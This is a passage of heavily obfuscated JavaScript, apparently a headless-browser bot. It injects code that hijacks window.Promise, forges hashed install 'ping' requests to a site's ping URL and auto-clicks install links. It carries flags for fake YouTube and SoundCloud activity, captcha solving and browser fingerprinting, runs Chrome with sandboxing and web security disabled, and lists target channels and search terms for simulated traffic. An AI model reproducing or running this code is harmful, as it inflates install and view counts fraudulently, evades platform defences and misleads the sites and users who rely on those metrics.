-0xa83 + 0x1d * -0xac & L) << y[-0x18a * 0x5 + 0x366 + 0x44f & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x1dfb + -0x27 * 0x63 + -0x2ee * 0x5 ? (this['block'] = P[0xd11 + 0x5 * 0x51b + -0x2688], this['start'] = N - (0x61 + 0x11ba * -0x1 + 0x1199), this['hash'](), this['hashed'] = -0x1498 + -0x11 * 0x1fb + -0x12e * -0x2e) : this['start'] = N;
                }
                return this['bytes'] > -0xa7623f24 + -0x3a4a6420 + 0x1e1aca343 && (this['hBytes'] += this['bytes'] / (0x1b381ecfc * -0x1 + 0xa0cd * 0x1cfb4 + -0x1a048 * -0xf623) << -0x1 * 0x2526 + -0x4a1 * 0x5 + 0x3c4b, this['bytes'] = this['bytes'] % (-0x4 * -0x12007619 + 0xa66 * -0x6cece + 0xfec899b0)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x1781 + 0x142 * 0x4 + 0xe44 * -0x2;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x46 * -0x7 + -0x105a + 0xe80] = this['block'], J[K >> -0x6f * -0x4a + 0x132e + -0x3342] |= x[-0xffa + -0x1872 + 0x286f & K], this['block'] = J[0x244 * -0xc + -0x75d * -0x2 + -0x2 * -0x643], K >= 0x22d * -0x11 + -0x2 * -0x3 + 0x252f && (this['hashed'] || this['hash'](), J[0x2 * -0x10e5 + -0x1951 * -0x1 + 0x879] = this['block'], J[-0x1 * 0xb39 + 0xed0 + -0x12d * 0x3] = J[0xdca + 0x5f8 + -0x13c1] = J[-0x1 * -0xc9d + 0x157a + 0x15d * -0x19] = J[-0x2117 + 0xa59 * -0x1 + -0x2b73 * -0x1] = J[0x135f + 0x1 * 0x193 + -0x14ee] = J[-0x11ee + 0x1f34 + -0xd41] = J[0x1 * 0x857 + -0x1195 + 0x944] = J[0xa71 + -0x322 * 0x9 + 0x8e4 * 0x2] = J[-0x2313 + -0x237a + -0x13d * -0x39] = J[-0x27 * -0x71 + 0x1 * -0x1a18 + 0x1 * 0x8ea] = J[0x1a58 + -0xdd4 + -0xc7a] = J[0x1c3e + 0x1 * 0x1fc + -0x1e2f] = J[0x17d4 + 0x6c8 + -0x1e90] = J[-0x1 * -0x1d61 + 0x1e47 + 0x3b9b * -0x1] = J[-0x170d + 0x204f * -0x1 + 0x2 * 0x1bb5] = J[0x17 * -0x160 + 0x3eb * 0x4 + 0x1003] = 0x40f + 0x207 * -0x11 + 0x116 * 0x1c), J[-0x2c * -0x80 + -0x11c8 * 0x1 + -0x42a] = this['hBytes'] << -0x21c1 * 0x1 + 0x151 + 0x2073 | this['bytes'] >>> 0x22 * 0x26 + 0x1 * 0x1481 + -0x1970, J[0xa1b * -0x2 + 0x1 * 0x1c7 + 0x127e] = this['bytes'] << 0xbe2 + -0x1c66 + 0x1087, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x40 * 0x16 + 0x1f4d + -0x19bd; J < -0x25c9 * -0x1 + -0x1 * 0x188f + -0xae * 0x13; ++J)
                K = Q[J - (-0x698 + 0x26ec + -0x2051 * 0x1)] ^ Q[J - (0x23ce + 0xc06 * -0x2 + -0xbba)] ^ Q[J - (0x2489 + 0x1a94 + 0x3 * -0x1505)] ^ Q[J - (0x25dd + -0x1 * 0x17c7 + -0xe06)], Q[J] = K << 0x27e * -0x7 + -0x4 * 0x593 + 0x27bf | K >>> 0x2603 + 0x2 * 0x7a9 + -0x3536;
              for (J = 0x22ac + -0xe4d * 0x1 + -0x145f * 0x1; J < -0x75 * -0x1 + -0x282 + 0x221; J += -0x1237 + -0xe5a + 0x1 * 0x2096)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * -0x20f7 + -0x143d + -0x19 * -0x221 | L >>> -0x7df + 0x1 * -0x469 + -0x421 * -0x3) + (M & N | ~M & O) + P + (0x1 * -0x37e5855a + -0x1f2fca2d + 0xb197c920) + Q[J] << -0x4d2 * -0x2 + -0x1 * 0x1493 + 0xaef) << 0x1 * 0x112d + 0x1 * 0x1eb9 + 0x1 * -0x2fe1 | P >>> 0x8 * -0x2a7 + 0x14f9 + 0x6 * 0xf) + (L & (M = M << 0x5 * 0x60d + -0x13c8 + -0xa5b | M >>> 0x4cd * -0x4 + -0x2095 + 0x33cb) | ~L & N) + O + (0x38ea39f5 + -0x35c532ab + 0x575d724f) + Q[J + (0x8 * -0x6b + -0x8ca + 0xc23)] << 0x579 + 0x121f * -0x1 + -0x1 * -0xca6) << -0x19f1 + 0x415 + 0x15e1 * 0x1 | O >>> -0x265b + 0x1d6f + 0x907) + (P & (L = L << 0x521 * 0x1 + -0x45a + -0xa9 | L >>> 0x106c + 0x1927 * 0x1 + -0x2991) | ~P & M) + N + (0x54 * 0x1ee423f + 0xd * 0x29eeda6 + -0x4381 * 0x19101) + Q[J + (0x2671 * -0x1 + 0x1df0 + 0x883 * 0x1)] << 0xaf7 * 0x3 + 0x1 * 0x14a6 + -0x5f3 * 0x9) << -0x1586 + -0x16b9 + -0x2 * -0x1622 | N >>> 0xff1 + 0x18c1 + -0x2897) + (O & (P = P << -0xc27 * 0x1 + -0x19 * -0x69 + 0x204 | P >>> 0x7d6 + 0x1688 + -0x1e5c) | ~O & L) + M + (0x2ad8f04 * 0x2 + 0x1602af7 * -0x65 + 0x700c2782 * 0x2) + Q[J + (0x2581 + 0x2589 + 0x1 * -0x4b07)] << 0x2383 + 0x5 * -0x507 + -0x298 * 0x4) << 0x5f4 + -0x77a + 0x18b | M >>> 0x24bd + 0x1d9d + -0x423f) + (N & (O = O << -0x2 * -0x10d4 + -0x16bd + -0xacd | O >>> -0x192d + -0x1 * 0x1357 + 0x2c86) | ~N & P) + L + (0x80ee04ec + -0x31a6adb7 + 0xb3b2264) + Q[J + (-0x7ab + -0x250 + 0x9ff)] << -0x9da + -0x24db + -0xb * -0x43f, N = N << -0x1be6 + 0x1 * 0x25de + 0xd * -0xc2 | N >>> -0xb90 + 0x518 * -0x2 + -0x45a * -0x5;
              for (; J < 0x2278 * 0x1 + -0x100 * 0xb + -0x2ea * 0x8; J += -0xb63 + -0x1f7 * 0x11 + 0x2ccf)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x16 * 0x14b + 0x976 * -0x2 + -0x3 * 0x32b | L >>> -0x1 * -0x1a08 + -0x1 * -0x1aa2 + 0x45 * -0xc3) + (M ^ N ^ O) + P + (0x756e * -0x176a3 + 0x1fdaf2 * 0x245 + 0xd2677d71 * 0x1) + Q[J] << 0x67d * 0x3 + -0x1393 + 0x1c) << 0x4 * 0x650 + -0x5cf * 0x1 + -0x136c | P >>> 0x601 * -0x5 + 0x1782 + 0x69e) + (L ^ (M = M << 0xfae + -0x5f0 + 0x7 * -0x160 | M >>> -0xf * -0x26d + 0xe * -0xeb + -0x1787) ^ N) + O + (-0x199d2bf3 + -0x2f0d2f7 * -0x12 + 0x53884236) + Q[J + (-0x698 + -0x7 * -0x3ce + -0x1409)] << 0x1478 + 0x8b * 0x38 + -0x32e0) << -0x745 + 0x29 * -0xa9 + 0x225b | O >>> 0x1 * 0xe1b + 0x23 * 0x62 + -0x1b66) + (P ^ (L = L << -0x115 * 0x1d + 0x9d4 + -0x3 * -0x739 | L >>> -0x1aef + -0x15d3 + 0x30c4) ^ M) + N + (-0x10 * -0xb0619e7 + 0x9195c418 + -0x1 * 0xd31d76e7) + Q[J + (0x1 * 0x10df + 0x1 * -0x1ed6 + 0xdf9)] << 0x121d + 0x5 * -0x655 + 0x242 * 0x6) << 0x1 * -0x1c09 + 0x18cd + 0x341 * 0x1 | N >>> 0x1f45 + -0x7 * -0x1f3 + -0x2ccf) + (O ^ (P = P << -0xe56 + -0x1dcd + -0x1 * -0x2c41 | P >>> -0x130f + 0x8d4 + -0x1 * -0xa3d) ^ L) + M + (-0xb2e8c834 + 0x242f * -0x5e58c + -0x3 * -0xa7b52d83) + Q[J + (-0x2228 + 0xbd7 * -0x1 + -0x6 * -0x7ab)] << -0xe29 + -0x11fe + -0x1 * -0x2027) << 0x59d + -0x2 * 0x1f + -0x55a | M >>> -0x37e * -0xa + -0x8 * -0x432 + 0x2d * -0x185) + (N ^ (O = O << 0x4 * -0x207 + -0x23d3 + 0x2c0d | O >>> 0xe83 + 0x26d7 + -0x3558) ^ P) + L + (-0xda9e0cff + -0x9002 * -0x85d5 + 0xa * 0x196b1c7f) + Q[J + (0x1 * -0x11a1 + 0x24eb + 0x9a3 * -0x2)] << 0x1 * 0x182d + -0x615 + -0x1218, N = N << 0x1853 + 0x728 + -0x1f5d | N >>> -0x238b * 0x1 + -0x1983 + 0x4 * 0xf44;
              for (; J < 0x66b * -0x6 + 0x10e6 + 0x15d8; J += -0xb81 + -0x26ec + 0x1 * 0x3272)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1b65 * 0x1 + -0x313 * -0x4 + -0x27ac | L >>> 0x1 * 0x1c8b + -0x2516 + 0x8a6) + (M & N | M & O | N & O) + P - (-0x17aae9e7 * -0x1 + 0x215cbf97 + 0x129edde2 * 0x3) + Q[J] << -0x2b * 0x3e + 0x252f + -0x1ac5) << 0x1d88 + -0x490 * 0x1 + -0x3 * 0x851 | P >>> -0x68 * 0x10 + -0x2097 + -0xad * -0x3a) + (L & (M = M << -0x8d6 + 0x1da1 + -0x43 * 0x4f | M >>> 0x3 * -0xacf + -0x2459 + -0x7c * -0x8e) | L & N | M & N) + O - (-0xb2b74638 + -0x3 * 0x2eb5ccc9 + 0x1afbcefb7) + Q[J + (-0x268b * 0x1 + 0x24ac + 0x1e * 0x10)] << 0x7d5 * -0x1 + -0x7 * -0x356 + -0x1d * 0x89) << 0x21 * -0x33 + -0xf61 + -0x2d * -0x7d | O >>> -0x1d7b * -0x1 + -0x799 + -0x15c7) + (P & (L = L << 0x281 * -0xb + -0x1625 * -0x1 + 0x584 | L >>> -0x1923 + 0x622 * 0x5 + -0x3 * 0x1d7) | P & M | L & M) + N - (-0x1349d7ab * -0x7 + -0x8c36beef + 0x5 * 0x179e05ae) + Q[J + (0x1 * 0x8c8 + 0x840 + -0x1106)] << 0x1 * 0x452 + 0xbc3 + -0x1015) << -0xb * -0x1f4 + -0xfd9 * -0x2 + -0x3529 | N >>> -0xa * -0xf8 + -0x2f * 0x92 + 0x1139) + (O & (P = P << 0x1b57 + 0x19c9 * 0x1 + -0x3502 | P >>> 0x1b2e + 0xffc + -0xaca * 0x4) | O & L | P & L) + M - (-0x6f9ed245 * -0x1 + 0x223219 * 0x6b + -0xd057f94) + Q[J + (-0x1482 + -0x11 * -0x50 + 0xf35)] << 0x13c8 + 0xc8e * 0x2 + -0x2ce4) << 0x219c + 0x5 * -0x511 + -0x12e * 0x7 | M >>> 0x3 * -0x75b + 0x7 * -0x301 + 0x2b33) + (N & (O = O << 0x1460 + -0x166 + -0x11 * 0x11c | O >>> -0x1d1b + -0x6 * 0x669 + 0x4393) | N & P | O & P) + L - (-0x1558c4b9 * -0x1 + 0x5c307e24 + -0xa4ffb9) + Q[J + (0x20a1 + 0xbb5 + 0x3e * -0xb7)] << 0x767 + -0x20af * -0x1 + 0x140b * -0x2, N = N << 0xc46 + 0x6 * -0x34b + 0x79a | N >>> 0x911 + -0x1f * -0xd7 + -0x2318;
              for (; J < 0x7f8 + 0xd1 + -0x9 * 0xf1; J += 0x129f + -0x12e8 + 0x4e)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1803 * -0x1 + 0x62f * 0x5 + -0x36e9 | L >>> -0x186e * 0x1 + -0x1a3 * 0x9 + 0x2744) + (M ^ N ^ O) + P - (0x21a7a590 + -0x39c5c869 + -0x1 * -0x4dbb6103) + Q[J] << 0x2 * 0x128f + 0x2364 + -0x4882) << 0xada * -0x1 + 0x965 * -0x2 + 0x1da9 | P >>> 0x5dd + -0x1d53 + 0x1791) + (L ^ (M = M << -0x12 * 0x6d + 0xe5c * 0x1 + -0x1 * 0x694 | M >>> 0x989 + 0x330 * -0x8 + 0xff9) ^ N) + O - (0x200e7415 * -0x2 + -0xb03 * 0x5fb1f + 0xb7966cb1) + Q[J + (0x44 * 0x17 + 0x2 * 0x108d + -0x2735)] << -0x6eb + 0xd * -0x11c + 0x1557) << -0x295 * -0x2 + -0x15c4 + 0x109f | O >>> 0xb74 + -0x2 * -0x1190 + -0x2e79) + (P ^ (L = L << 0x126c + -0x25e8 + 0x139a | L >>> -0x12b1 + 0x1e2d + -0xb7a) ^ M) + N - (-0x3994868 * -0x17 + -0x13cb17c3 * -0x1 + -0x30f35af1) + Q[J + (-0x3 * -0x233 + -0x213b + 0x1aa4)] << 0x13aa * -0x1 + 0x411 + 0xf99) << 0x9a4 + 0xdc0 + 0xc1 * -0x1f | N >>> -0x91e * -0x3 + 0x1484 * 0x1 + -0x2fc3) + (O ^ (P = P << -0x1f11 + -0x206 * -0x2 + 0x1b23 | P >>> 0x1 * 0x217c + 0x1ec1 * 0x1 + -0x403b) ^ L) + M - (0xd1 * -0x2cf096 + -0xcb9293f + -0x95db5fd * -0xb) + Q[J + (-0x122 + -0x731 + -0x61 * -0x16)] << 0x8f5 * 0x3 + -0x1 * -0x23cc + -0x3eab * 0x1) << -0x12dd + -0x1 * -0xf2f + -0x1 * -0x3b3 | M >>> -0x1 * 0xb2a + -0x2 * 0xee9 + -0x2917 * -0x1) + (N ^ (O = O << 0x2644 + 0x1263 + 0x29 * -0x161 | O >>> -0x45 * 0x63 + 0x1e47 * -0x1 + 0x38f8) ^ P) + L - (-0x17 * 0x13aaccf + 0x44ef9f5b + 0x3e8cc8 * 0x35) + Q[J + (0x1929 + -0x115e + 0xb * -0xb5)] << 0x6fa * 0x1 + -0x24fd + -0x3 * -0xa01, N = N << -0xd * 0x1bc + -0x1d4e + 0x2 * 0x19fc | N >>> -0x268 * 0x2 + -0x1929 + 0x1dfb;
              this['h0'] = this['h0'] + L << -0x1aa1 * -0x1 + -0x20e2 + 0x641, this['h1'] = this['h1'] + M << 0x2331 + -0x3a2 * -0x9 + -0x43e3, this['h2'] = this['h2'] + N << -0x1 * 0xc65 + 0x11a7 * 0x1 + -0x542, this['h3'] = this['h3'] + O << -0xc * 0x14e + -0x1a76 * 0x1 + 0x2a1e, this['h4'] = this['h4'] + P << 0x60b + 0x1 * -0x1bd7 + 0x15cc;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x1451 * -0x1 + 0xc2 * 0x11 + -0x1 * -0x78b & 0x2121 + 0x2677 + -0x4789] + w[J >> -0x20bd * -0x1 + 0xd * -0x15c + -0xef9 & 0x355 + -0x36 * 0x11 + -0x5 * -0x10] + w[J >> 0x1 * -0x2699 + 0x5 * -0xeb + -0x15a2 * -0x2 & -0x184 + -0xc * -0xfb + -0xa31 * 0x1] + w[J >> 0x134 + -0x1fec + -0x3d9 * -0x8 & 0x7 * -0x86 + -0x1 * -0x11ae + -0xdf5] + w[J >> -0x18f3 + -0x33d * -0x4 + 0xc0b & 0x1 * -0x90f + -0x2251 * 0x1 + 0x1 * 0x2b6f] + w[J >> -0x14 * -0xba + 0x10eb + -0x1f6b & 0x5 * -0x433 + 0xe91 + 0xb * 0x97] + w[J >> 0xbe5 + -0x4e * -0x25 + -0x1727 * 0x1 & -0x65 + 0x3fa * 0x4 + -0xf74] + w[0x13a * -0xc + 0x17ab + -0x4 * 0x239 & J] + w[K >> -0x1 * 0xd9a + 0x1d * 0x37 + 0x77b & -0x15b5 + -0x2114 + 0x36d8] + w[K >> -0x9 * -0x1df + 0x3 * 0x8be + 0x243 * -0x13 & -0x1e81 + 0x1e4d + 0x43 * 0x1] + w[K >> 0x2074 + -0x5c9 * -0x2 + -0x2bf2 & -0x6a8 * 0x3 + 0xaee * 0x1 + -0x919 * -0x1] + w[K >> 0x1 * -0x17e5 + 0x1 * 0x2515 + -0x8c * 0x18 & 0x2050 + -0x26d1 + 0x690] + w[K >> -0x17bf + 0x2 * -0x7b3 + 0x2731 & -0x21b8 + -0x1169 * 0x1 + 0x16c * 0x24] + w[K >> -0x4ee + -0x10a * 0x25 + 0x2b68 & -0x1893 + -0xd9 * -0x5 + 0xe3 * 0x17] + w[K >> 0x1 * 0x227d + 0x3c1 * 0x5 + -0x353e & 0x266b + 0x1484 + -0x1d7 * 0x20] + w[-0x11 * -0x24b + -0x59 * -0x29 + -0x352d & K] + w[L >> -0x19 * 0x13a + -0x149 * -0x13 + 0x65b & 0x1b83 + -0xbe8 + 0x4 * -0x3e3] + w[L >> 0x131d + -0xc56 + -0x6af & -0x26bf + -0x2103 + 0x47d1] + w[L >> -0x2ab * 0x3 + 0x1 * -0x1d79 + -0x13 * -0x1fa & -0x10ab + -0x3d * 0x78 + 0x2d52] + w[L >> 0x1db3 * 0x1 + -0x2 * 0x612 + 0x5d5 * -0x3 & -0x4 * -0xcc + -0xe9 + -0x8e * 0x4] + w[L >> 0x471 + -0x2 * -0x9e9 + -0x1837 & -0x20d7 + 0x2cd + 0x1e19] + w[L >> -0xb1 * -0x1f + 0x1334 + 0x3b1 * -0xb & -0x1 * -0x7e6 + -0x1d * -0x77 + -0x1552] + w[L >> 0x122d + 0x103d * 0x1 + -0x2266 & -0x1ca4 + 0x13 * -0x1bc + 0x3da7] + w[-0x20bd + -0x2 * -0x8b4 + 0x2 * 0x7b2 & L] + w[M >> 0xa * 0x17a + 0x7b + -0x1 * 0xf23 & -0x7b5 + -0x2 * 0x5f6 + 0x13b0] + w[M >> -0x2073 + -0x3 * 0x373 + 0x2ae4 & -0x2c1 * -0xd + 0x1994 + -0x1ea9 * 0x2] + w[M >> -0x1550 + 0x1 * 0x223a + -0xcd6 & -0x1 * 0x22bd + -0xc16 * -0x3 + -0x176] + w[M >> 0x2 * -0x6b3 + 0x842 + 0x534 & -0x12f9 * -0x1 + -0x2291 + -0x1 * -0xfa7] + w[M >> -0x135a + 0x1565 + -0x49 * 0x7 & -0x2332 + 0x21b7 + 0x18a * 0x1] + w[M >> -0x13d6 + 0xc10 + 0x7ce & -0x71b * -0x1 + 0x22bb + -0x29c7] + w[M >> 0x51 * -0x5 + -0x5b * 0x49 + 0x1b8c & 0x9bb + -0x6 * 0x1bd + 0xc2] + w[0x2 * 0xc50 + 0xd8b + -0x261c & M] + w[N >> 0x1460 + 0x3b * 0x6f + -0x2dd9 * 0x1 & 0xc21 + 0x2 * -0x1151 + 0x1690] + w[N >> 0x9 * 0x204 + 0x23be + -0x5a * 0x99 & 0xfa8 + -0x15d + -0xe3c] + w[N >> -0x1bb * -0x3 + 0x2f9 * -0x3 + 0x3ce & -0x1b2f + -0xe5 * 0x12 + 0x2b58] + w[N >> 0x1a1f + 0xd5d + 0x1 * -0x276c & 0x2666 + 0x79b + -0x2df2] + w[N >> -0x23d4 + -0x202f + 0x440f & -0x66d + -0x21d + 0x1f * 0x47] + w[N >> 0xd * 0x51 + 0x4fd * -0x1 + 0x1d * 0x8 & -0x10 * -0xbf + 0x1 * -0x53 + 0x1 * -0xb8e] + w[N >> -0x1 * 0xc6f + -0x3 * 0xbed + -0x2 * -0x181d & -0x2558 + -0x35 * 0x8d + 0x4298] + w[0x285 + -0x25e3 + -0x1 * -0x236d & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x9bd * 0x3 + -0x2 * -0x1127 + -0x3f6d & -0x1030 + -0x1c * 0x5b + 0x1b23,
                J >> -0x238 * -0x11 + -0x5 * 0x524 + 0x55 * -0x24 & 0xd * 0x1f3 + 0x6ed + -0x1 * 0x1f45,
                J >> 0x132 + 0x701 + -0x82b & -0x1a6b + 0xef2 * -0x1 + 0x2 * 0x152e,
                0x1227 + -0x1b9b + 0xa73 * 0x1 & J,
                K >> -0x1634 + -0x1 * 0x1adf + -0x1 * -0x312b & -0x1 * 0xd90 + 0x1 * 0xecf + -0x40,
                K >> -0xbad + 0xbf * -0xb + -0x2 * -0x9f9 & 0x1efb * 0x1 + -0x14f1 + -0x90b,
                K >> 0x1634 + -0x1a * -0x3b + 0x406 * -0x7 & -0x5 * 0x45d + 0x1a * -0x6b + 0x1df * 0x12,
                -0x3b * 0x5d + 0x3 * 0x2e3 + -0xeb * -0xf & K,
                L >> 0x146b * 0x1 + -0x10c6 + -0x38d & -0x143e * -0x1 + 0x2 * -0x2a1 + -0x1 * 0xdfd,
                L >> -0x582 + 0x6 * -0x72 + 0x83e & 0xd1f * 0x1 + -0x17c0 + 0x3 * 0x3e0,
                L >> -0x25c8 + 0x255f + 0x71 & 0x2a * -0x13 + 0x220d + -0xef8 * 0x2,
                -0x1672 + 0x1 * 0xb51 + 0x10 * 0xc2 & L,
                M >> 0x1 * -0xf47 + 0x176e + 0x80f * -0x1 & -0x215b * -0x1 + 0x66b + -0x26c7,
                M >> -0xc * -0xa7 + 0xa30 * -0x1 + -0x7c * -0x5 & 0xf89 + 0x222a * -0x1 + 0x13a0,
                M >> -0x8cc + -0xfb4 + 0x1888 & 0x3a5 + 0x16c0 + -0x1966,
                0x21 * 0x43 + -0x5d * -0x57 + 0x1 * -0x273f & M,
                N >> -0x6 * -0x18e + 0x37 * 0x2f + 0x31 * -0x65 & 0x6c3 * -0x1 + -0x22b0 + 0x2a72,
                N >> -0x1077 * 0x1 + -0x10f1 + 0x2178 & -0x4b * -0x31 + 0x195e + -0x26ba,
                N >> 0x2 * -0x5b3 + 0xf26 + 0x1c * -0x22 & 0xcdf + 0x1f4c + -0x133 * 0x24,
                -0x3 * -0x269 + -0x2 * -0x1183 + -0x2942 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x20c2 + 0x1db1 + -0x3e5f * 0x1), (K = new DataView(J))['setUint32'](0x1 * -0x246b + -0x1 * 0x11d9 + 0x3644, this['h0']), K['setUint32'](-0x3 * -0x5b + -0x2 * 0x5c5 + 0xa7d, this['h1']), K['setUint32'](-0x1fec + 0x19f9 + -0x1 * -0x5fb, this['h2']), K['setUint32'](0x2699 + -0x213e * 0x1 + -0x3 * 0x1c5, this['h3']), K['setUint32'](-0x289 + -0x14bb + -0xbaa * -0x2, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x2 * -0xfab + 0x1fd7 + -0x1 * 0x81];
        return window['Promise'] = class extends window[a3(0x1b)] {
          constructor(...J) {
            let K = 0x2025 + 0x1504 + -0x3529;
            J[0xe3 * 0x22 + -0x55d * 0x2 + -0x9b6 * 0x2]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x1 * 0x138e + -0x49d * 0x3 + 0x2165] = L => {
              const a4 = b;
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I[a4(0xd, 'V1G6') + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x15d2 + 0x193 + -0x1764), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x12 * -0x1f7 + 0x301 + -0x265e;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x6 * 0x641 + -0x19b5 + -0x5f5), Promise['resolve'](-0x1 * 0x995 + -0x18f7 + 0x228d);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x19a8 + 0x369 * 0x1 + -0x1 * 0x1d11; j < -0x4f1 + 0x783 + -0x291; j++)
    i();
}
const NETWORK_PATIENCE = 0xd5e + 0x218a + 0xfa8 * -0x1 + (-0x1 * -0x2081 + 0x2 * -0xee + -0x12ed) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x1d29 + -0x19aa + -0x37c) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0xa3e * -0x2 + 0x9b0 + -0x1e2c);
    let h = e[f];
    return h;
  }, d(b, c);
}
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x2506 + -0x4 * -0x8e6 + 0x16e; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 